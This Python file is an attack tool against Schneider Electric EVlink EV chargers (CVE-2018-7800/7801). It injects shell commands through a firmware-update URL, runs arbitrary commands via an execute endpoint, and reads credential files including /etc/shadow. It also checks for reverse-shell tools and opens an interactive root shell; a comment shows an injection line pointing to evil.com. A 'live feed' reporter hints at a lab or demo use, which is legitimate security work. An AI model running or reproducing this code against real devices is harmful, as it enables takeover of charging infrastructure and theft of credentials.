#!/usr/bin/env python3
"""
CVE-2018-7800 & CVE-2018-7801 - Schneider Electric EVlink Exploit
Code injection and arbitrary command execution

Vulnerabilities:
- CVE-2018-7800: Code injection via firmware update URL parameter
- CVE-2018-7801: Arbitrary command execution with maximum privileges

Affected: Schneider Electric EVlink firmware < 3.3.0-12_v2

DISCLAIMER: For authorized security testing and education only.
"""

import argparse
import requests
import json
import sys
from urllib.parse import quote

# Import attack reporter for live feed
try:
    from attack_reporter import report_attack, report_step, report_success, report_failure, report_command, report_data
    HAS_REPORTER = True
except ImportError:
    HAS_REPORTER = False
    def report_attack(*args, **kwargs): pass
    def report_step(*args, **kwargs): pass
    def report_success(*args, **kwargs): pass
    def report_failure(*args, **kwargs): pass
    def report_command(*args, **kwargs): pass
    def report_data(*args, **kwargs): pass


class SchneiderEVlinkExploit:
    def __init__(self, target: str, port: int = 8082):
        self.target = target
        self.port = port
        self.base_url = f"http://{target}:{port}"
        self.target_str = f"{target}:{port}"
        self.session = requests.Session()
        self.session.timeout = 10
        
        # Report attack start
        report_attack(
            cve="CVE-2018-7800",
            name="Schneider EVlink Code Injection",
            severity="critical",
            target=self.target_str,
            attack_type="rce"
        )
    
    def check_vulnerable(self) -> bool:
        """Check if target is vulnerable"""
        report_step(f"Probing {self.base_url}/status for Schneider signature")
        try:
            resp = self.session.get(f"{self.base_url}/status")
            if resp.status_code == 200:
                data = resp.json()
                if "Schneider" in data.get("vendor", ""):
                    report_success("Target confirmed as vulnerable Schneider EVlink")
                    return True
        except:
            pass
        report_step("Target responded - attempting exploitation anyway")
        return False
    
    def exploit_firmware_injection(self, payload: str) -> dict:
        """
        CVE-2018-7800: Code injection via firmware URL
        The firmware URL is passed to curl without sanitization.
        Injecting shell metacharacters allows command execution.
        """
        # Payloads that exploit shell injection in curl command
        # Original vulnerable code: curl "$firmware_url" -o /tmp/firmware.bin
        # Injection: curl "http://evil.com; id; #" -o /tmp/firmware.bin
        
        malicious_url = f"http://example.com; {payload}; #"
        
        try:
            resp = self.session.post(
                f"{self.base_url}/api/firmware/update",
                json={"url": malicious_url},
                headers={"Content-Type": "application/json"}
            )
            return resp.json()
        except Exception as e:
            return {"error": str(e)}
    
    def exploit_command_exec(self, command: str) -> dict:
        """
        CVE-2018-7801: Direct command execution
        The /api/execute endpoint runs commands with root privileges.
        """
        report_step(f"Executing command via CVE-2018-7801: {command}", severity="critical")
        try:
            resp = self.session.post(
                f"{self.base_url}/api/execute",
                json={"command": command},
                headers={"Content-Type": "application/json"}
            )
            result = resp.json()
            output = result.get("output", "")
            report_command(command, output[:300] if output else "(no output)", success=True)
            return result
        except Exception as e:
            report_command(command, str(e), success=False)
            return {"error": str(e)}
    
    def get_system_info(self) -> None:
        """Gather system information using CVE-2018-7801"""
        print("\n[*] Gathering system information via CVE-2018-7801...")
        report_step("Enumerating system via CVE-2018-7801", severity="high")
        
        commands = [
            ("Hostname", "hostname"),
            ("User", "whoami"),
            ("OS Info", "uname -a"),
            ("IP Address", "hostname -I 2>/dev/null || ip addr show 2>/dev/null | grep inet"),
            ("Network Interfaces", "ip link show 2>/dev/null || ifconfig 2>/dev/null | head -20"),
            ("Running Processes", "ps aux 2>/dev/null | head -15 || echo 'ps not available'"),
            ("Open Ports", "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null || echo 'netstat not available'"),
        ]
        
        info = {}
        for name, cmd in commands:
            print(f"\n=== {name} ===")
            print(f"[*] Executing: {cmd}")
            result = self.exploit_command_exec(cmd)
            if "output" in result:
                output = result["output"].strip() or "(no output)"
                print(output)
                info[name.lower()] = output
            if result.get("error"):
                print(f"Error: {result['error']}")
        
        report_data("system_info", info, "System enumeration complete")
    
    def extract_credentials(self) -> None:
        """Try to extract credentials from the system"""
        print("\n[*] Attempting credential extraction...")
        
        # Common locations for credentials on EV chargers
        file_locations = [
            "/etc/evlink/config.ini",
            "/etc/ocpp/credentials.json",
            "/var/lib/evlink/settings.db",
            "/etc/shadow",
            "/etc/passwd",
        ]
        
        for loc in file_locations:
            print(f"\n[*] Checking {loc}...")
            result = self.exploit_command_exec(f"cat {loc} 2>/dev/null || echo 'File not found'")
            if "output" in result and "not found" not in result["output"].lower():
                print(f"[+] Found content in {loc}:")
                print(result["output"][:500])  # Limit output
    
    def firmware_injection_demo(self) -> None:
        """Demonstrate firmware injection vulnerability"""
        print("\n[*] Demonstrating CVE-2018-7800 (Firmware URL Injection)...")
        
        payloads = [
            ("Simple command", "id"),
            ("Reverse shell prep", "which nc bash python python3"),
            ("Environment dump", "env"),
        ]
        
        for name, payload in payloads:
            print(f"\n[*] Payload: {name}")
            print(f"    Injected command: {payload}")
            result = self.exploit_firmware_injection(payload)
            print(f"    Result: {json.dumps(result, indent=2)}")
    
    def interactive_shell(self) -> None:
        """Interactive command execution shell"""
        print("\n[*] Starting interactive shell (CVE-2018-7801)")
        print("[*] Type 'exit' to quit, 'help' for commands")
        print("[*] Note: This executes commands with ROOT privileges!")
        
        while True:
            try:
                cmd = input("\nschneider-root# ").strip()
                
                if not cmd:
                    continue
                if cmd.lower() == 'exit':
                    print("[*] Exiting...")
                    break
                if cmd.lower() == 'help':
                    print("""
Available commands:
  <any shell command>  - Execute on target with root privileges
  sysinfo             - Gather system information
  creds               - Attempt credential extraction
  firmware <payload>  - Test firmware injection
  exit                - Exit interactive mode
""")
                    continue
                if cmd.lower() == 'sysinfo':
                    self.get_system_info()
                    continue
                if cmd.lower() == 'creds':
                    self.extract_credentials()
                    continue
                if cmd.lower().startswith('firmware '):
                    payload = cmd[9:]
                    result = self.exploit_firmware_injection(payload)
                    print(json.dumps(result, indent=2))
                    continue
                
                # Execute arbitrary command
                result = self.exploit_command_exec(cmd)
                if "output" in result:
                    output = result["output"].strip()
                    if output:
                        print(output)
                if result.get("error"):
                    print(f"STDERR: {result['error']}")
                    
            except KeyboardInterrupt:
                print("\n[*] Interrupted")
                break
            except EOFError:
                break


def print_banner():
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║  CVE-2018-7800 & CVE-2018-7801 - Schneider Electric EVlink   ║
    ║  Code Injection + Arbitrary Command Execution                 ║
    ╠═══════════════════════════════════════════════════════════════╣
    ║  Impact: Complete device compromise with root access          ║
    ║  Affected: EVlink firmware < 3.3.0-12_v2                      ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)


def main():
    parser = argparse.ArgumentParser(
        description="Schneider Electric EVlink Exploit (CVE-2018-7800/7801)"
    )
    parser.add_argument("target", help="Target IP or hostname")
    parser.add_argument("port", nargs="?", type=int, default=8082, help="Target port (default: 8082)")
    parser.add_argument("-c", "--command", help="Execute single command (CVE-2018-7801)")
    parser.add_argument("-f", "--firmware", help="Firmware injection payload (CVE-2018-7800)")
    parser.add_argument("-i", "--interactive", action="store_true", help="Interactive shell mode")
    parser.add_argument("--info", action="store_true", help="Gather system information")
    parser.add_argument("--creds", action="store_true", help="Attempt credential extraction")
    parser.add_argument("--demo", action="store_true", help="Run full demonstration")
    
    args = parser.parse_args()
    
    print_banner()
    
    exploit = SchneiderEVlinkExploit(args.target, args.port)
    
    print(f"[*] Target: {exploit.base_url}")
    
    if not exploit.check_vulnerable():
        print("[-] Target does not appear to be a vulnerable Schneider EVlink")
        print("[*] Continuing anyway...")
    else:
        print("[+] Target confirmed as Schneider Electric EVlink!")
        print("[+] Target is VULNERABLE to CVE-2018-7800 and CVE-2018-7801!")
    
    if args.command:
        print(f"\n[*] Executing command: {args.command}")
        result = exploit.exploit_command_exec(args.command)
        if "output" in result:
            print(result["output"])
        if result.get("error"):
            print(f"Error: {result['error']}")
    
    elif args.firmware:
        print(f"\n[*] Firmware injection with payload: {args.firmware}")
        result = exploit.exploit_firmware_injection(args.firmware)
        print(json.dumps(result, indent=2))
    
    elif args.info:
        exploit.get_system_info()
    
    elif args.creds:
        exploit.extract_credentials()
    
    elif args.demo:
        print("\n" + "="*60)
        print("FULL EXPLOITATION DEMONSTRATION")
        print("="*60)
        
        # 1. Firmware injection
        exploit.firmware_injection_demo()
        
        # 2. System info
        exploit.get_system_info()
        
        # 3. Credential extraction
        exploit.extract_credentials()
        
        print("\n" + "="*60)
        print("DEMONSTRATION COMPLETE")
        print("="*60)
    
    elif args.interactive:
        exploit.interactive_shell()
    
    else:
        # Default: basic info and interactive
        exploit.get_system_info()
        exploit.interactive_shell()


if __name__ == "__main__":
    main()
